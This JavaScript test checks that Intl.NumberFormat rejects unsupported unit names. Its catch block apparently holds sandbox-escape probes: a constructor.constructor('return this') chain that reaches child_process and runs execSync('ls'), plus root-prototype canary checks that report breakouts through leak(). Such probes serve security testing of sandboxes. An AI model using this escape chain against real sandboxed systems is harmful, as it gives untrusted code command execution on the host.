try {
    const units = [
        'acre-foot',
        'ampere',
        'arc-minute',
        'arc-second',
        'astronomical-unit',
        'atmosphere',
        'bushel',
        'calorie',
        'carat',
        'centiliter',
        'century',
        'cubic-centimeter',
        'cubic-foot',
        'cubic-inch',
        'cubic-kilometer',
        'cubic-meter',
        'cubic-mile',
        'cubic-yard',
        'cup-metric',
        'cup',
        'day-person',
        'deciliter',
        'decimeter',
        'fathom',
        'foodcalorie',
        'furlong',
        'g-force',
        'gallon-imperial',
        'generic',
        'gigahertz',
        'gigawatt',
        'hectoliter',
        'hectopascal',
        'hertz',
        'horsepower',
        'inch-hg',
        'joule',
        'karat',
        'kelvin',
        'kilocalorie',
        'kilohertz',
        'kilojoule',
        'kilowatt-hour',
        'kilowatt',
        'knot',
        'light-year',
        'lux',
        'megahertz',
        'megaliter',
        'megawatt',
        'metric-ton',
        'microgram',
        'micrometer',
        'microsecond',
        'milliampere',
        'millibar',
        'milligram',
        'millimeter-of-mercury',
        'milliwatt',
        'month-person',
        'nanometer',
        'nanosecond',
        'nautical-mile',
        'ohm',
        'ounce-troy',
        'parsec',
        'permille',
        'picometer',
        'pint-metric',
        'pint',
        'point',
        'quart',
        'radian',
        'revolution',
        'square-centimeter',
        'square-foot',
        'square-inch',
        'square-kilometer',
        'square-meter',
        'square-mile',
        'square-yard',
        'tablespoon',
        'teaspoon',
        'ton',
        'volt',
        'watt',
        'week-person',
        'year-person',
        'liter-per-100kilometers',
        'meter-per-second-squared',
        'mile-per-gallon-imperial',
        'milligram-per-deciliter',
        'millimole-per-liter',
        'part-per-million',
        'pound-per-square-inch'
    ];
    for (const unit of units) {
        assert.throws(RangeError, () => new Intl.NumberFormat(undefined, {
            style: 'unit',
            unit
        }), `Throw for ${ unit }`);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}